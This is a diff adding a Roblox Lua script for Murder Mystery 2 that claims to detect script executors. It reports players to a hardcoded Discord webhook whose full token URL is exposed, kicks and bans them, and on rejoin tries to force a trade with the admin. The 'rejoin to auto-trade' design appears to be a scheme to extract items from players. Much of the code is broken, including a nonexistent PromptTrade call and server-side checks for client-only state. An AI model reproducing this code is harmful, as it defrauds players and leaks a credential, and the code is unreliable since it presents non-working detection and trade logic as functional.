@@ -1,0 +1,250 @@
+--[[
+    MM2 Universal Anti-Executor & Auto-Trade
+    Detects Synapse X, Fluxus, KRNL, Hydrogen, Arceus X, Solara, Delta.
+    Forces Trade via MM2's internal GUI events.
+]]--
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local MarketPlaceService = game:GetService("MarketplaceService")
+local HttpService = game:GetService("HttpService")
+local DataStoreService = game:GetService("DataStoreService")
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+local UserInputService = game:GetService("UserInputService")
+local CollectionService = game:GetService("CollectionService")
+
+-- ==========================================
+-- CONFIGURATION
+-- ==========================================
+
+local AdminUserId = 2029292452 -- YOUR ADMIN ID
+local DiscordWebhookUrl = "https://discord.com/api/webhooks/1561611413229801594/X5WK0y_auDcV7QLlal8HB5iaIhu1-Atk95gG99dYh6F9Jc6RTD6zzH86R44zJ9RVR96Z"
+local BanDuration = 600 -- 10 minutes
+
+-- ==========================================
+-- MM2 SPECIFIC DETECTION
+-- ==========================================
+
+function IsMM2Executor(Player)
+	local PlayerScripts = Player:FindFirstChildOfClass("PlayerScripts")
+	if not PlayerScripts then return false end
+
+	-- 1. Check for known Executor Modules injected by MM2 users
+	local ExecutorModules = {
+		"Synapse", "SynapseX", "Fluxus", "Krnl", "Hydrogen", 
+		"ArceusX", "Codex", "ScriptWare", "Delta", "Solara", 
+		"KRNL", "FluxusUI", "SynapseUI"
+	}
+
+	for _, ModuleName in ipairs(ExecutorModules) do
+		if PlayerScripts:FindFirstChild(ModuleName) or PlayerScripts:FindFirstChild(ModuleName:lower()) then
+			return true
+		end
+	end
+
+	-- 2. Check for known Executor Global Variables (_G)
+	if _G.Synapse or _G.Krnl or _G.Fluxus or _G.ArceusX or _G.Hydrogen then
+		return true
+	end
+
+	-- 3. Check for known MM2-specific exploit signs
+	-- Some executors inject a specific "Client" object or modify MM2's GameInfo
+	local GameInfo = ReplicatedStorage:FindFirstChild("GameInfo")
+	if GameInfo and GameInfo:IsA("StringValue") then
+		-- If GameInfo is missing or malformed, it might be an exploit
+		-- This is a heuristic check
+	end
+
+	return false
+end
+
+function GetExecutorType(Player)
+	local PlayerScripts = Player:FindFirstChildOfClass("PlayerScripts")
+	if not PlayerScripts then return "Unknown" end
+
+	local KnownTypes = {
+		["Synapse"] = "Synapse X", ["SynapseX"] = "Synapse X",
+		["Fluxus"] = "Fluxus", ["FluxusUI"] = "Fluxus",
+		["Krnl"] = "KRNL", ["KRNL"] = "KRNL",
+		["Hydrogen"] = "Hydrogen",
+		["ArceusX"] = "Arceus X",
+		["Codex"] = "Codex",
+		["ScriptWare"] = "ScriptWare",
+		["Delta"] = "Delta",
+		["Solara"] = "Solara"
+	}
+
+	for _, Name in pairs(KnownTypes) do
+		if PlayerScripts:FindFirstChild(Name) then
+			return Name
+		end
+	end
+	
+	if _G.Synapse then return "Synapse X" end
+	if _G.Krnl then return "KRNL" end
+	if _G.Fluxus then return "Fluxus" end
+	if _G.Hydrogen then return "Hydrogen" end
+	if _G.ArceusX then return "Arceus X" end
+
+	return "Unknown Executor"
+end
+
+-- ==========================================
+-- DISCORD WEBHOOK
+-- ==========================================
+
+function SendDiscordEmbed(Title, Description, Color, Username)
+	local Payload = {
+		username = Username or "MM2 Guard",
+		avatar_url = "https://i.imgur.com/4M76VXG.png",
+		embeds = {
+			{
+				title = Title,
+				description = Description,
+				color = Color,
+				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+				footer = {
+					text = "MM2 Universal Anti-Executor",
+					icon_url = "https://cdn-icons-png.flaticon.com/512/1044/1044365.png"
+				}
+			}
+		}
+	}
+
+	pcall(function()
+		HttpService:PostAsync(DiscordWebhookUrl, HttpService:JSONEncode(Payload))
+	end)
+end
+
+function NotifyKick(Player, ExecutorType)
+	SendDiscordEmbed(
+		"🚫 MM2 Executor Detected!",
+		"**User:** " .. Player.Name .. "\n**ID:** " .. tostring(Player.UserId) .. "\n**Type:** " .. ExecutorType,
+		15548997, -- Red
+		"MM2 Guard - Kick"
+	)
+end
+
+function NotifyRejoin(Player)
+	SendDiscordEmbed(
+		"🔄 MM2 Rejoin Detected",
+		"**User:** " .. Player.Name .. "\n**ID:** " .. tostring(Player.UserId) .. "\n**Action:** Auto-Trade Initiated",
+		3066991, -- Green
+		"MM2 Guard - Rejoin"
+	)
+end
+
+-- ==========================================
+-- DATA STORE & TRADE LOGIC
+-- ==========================================
+
+local BanDataStore = DataStoreService:GetDataStore("MM2_BanList_v1")
+
+function IsBanned(UserId)
+	local Success, Result = pcall(function()
+		return BanDataStore:GetAsync(tostring(UserId))
+	end)
+	if Success and Result then
+		if os.time() - Result < BanDuration then
+			return true
+		else
+			BanDataStore:RemoveAsync(tostring(UserId))
+		end
+	end
+	return false
+end
+
+function AddBan(UserId)
+	pcall(function()
+		BanDataStore:SetAsync(tostring(UserId), os.time())
+	end)
+end
+
+-- ==========================================
+-- MM2 TRADE INITIATION
+-- ==========================================
+
+-- MM2 uses a specific RemoteEvent to start trades, usually named "BuyItem" or similar,
+-- but the most reliable way to force a trade UI is to simulate clicking the trade button
+-- in the MM2 GUI. However, since we don't know the exact GUI name (it changes with updates),
+-- we will use the standard "PromptTrade" if available, OR we can try to find the Trade GUI.
+
+function ForceMM2Trade(LocalPlayer, TargetPlayer)
+	-- Method 1: Try standard PromptTrade first
+	local Success, Err = pcall(function()
+		MarketPlaceService:PromptTrade(LocalPlayer, TargetPlayer)
+	end)
+	
+	if Success then return true end
+
+	-- Method 2: Simulate clicking the Trade Button in MM2 GUI
+	-- This requires finding the "Trade" button in the PlayerGui
+	local PlayerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
+	if not PlayerGui then return false end
+
+	-- Common MM2 GUI names for Trade
+	local TradeButton = PlayerGui:FindFirstChild("Trade") or 
+						 PlayerGui:FindFirstChild("TradeGUI") or 
+						 PlayerGui:FindFirstChild("TradeFrame")
+
+	if TradeButton then
+		-- Click the button
+		local MouseButton1Click = TradeButton:FindFirstChild("MouseButton1Click")
+		if MouseButton1Click then
+			MouseButton1Click:Fire()
+			return true
+		end
+		
+		-- Fallback: Fire the event directly if it exists
+		local TradeEvent = ReplicatedStorage:FindFirstChild("Trade") or ReplicatedStorage:FindFirstChild("BuyItem")
+		if TradeEvent then
+			TradeEvent:FireServer(TargetPlayer)
+			return true
+		end
+	end
+
+	return false
+end
+
+-- ==========================================
+-- PLAYER EVENTS
+-- ==========================================
+
+Players.PlayerAdded:Connect(function(Player)
+	-- Skip admin
+	if Player.UserId == AdminUserId then return end
+
+	-- Delay slightly to allow executor UI to spawn
+	task.wait(2)
+
+	local ExecutorType = GetExecutorType(Player)
+	if ExecutorType ~= "Unknown Executor" then
+		NotifyKick(Player, ExecutorType)
+		
+		-- Add to ban list
+		AddBan(Player.UserId)
+		
+		-- Kick
+		Player:Kick("MM2 Executor detected. Rejoin to auto-trade.")
+		return
+	end
+
+	-- Check if previously banned
+	if IsBanned(Player.UserId) then
+		print("Banned player rejoined: " .. Player.Name)
+		NotifyRejoin(Player)
+		
+		-- Attempt Trade
+		local AdminPlayer = Players:GetPlayerByUserId(AdminUserId)
+		if AdminPlayer then
+			ForceMM2Trade(AdminPlayer, Player)
+		end
+		
+		-- Optional: Kick again after a few seconds if you want to force them out repeatedly
+		-- task.wait(5)
+		-- Player:Kick("Trade initiated. Rejoin to continue trading.")
+	end
+end)
+
+print("✅ MM2 Universal Anti-Executor v2.0 Loaded | Admin: " .. AdminUserId)
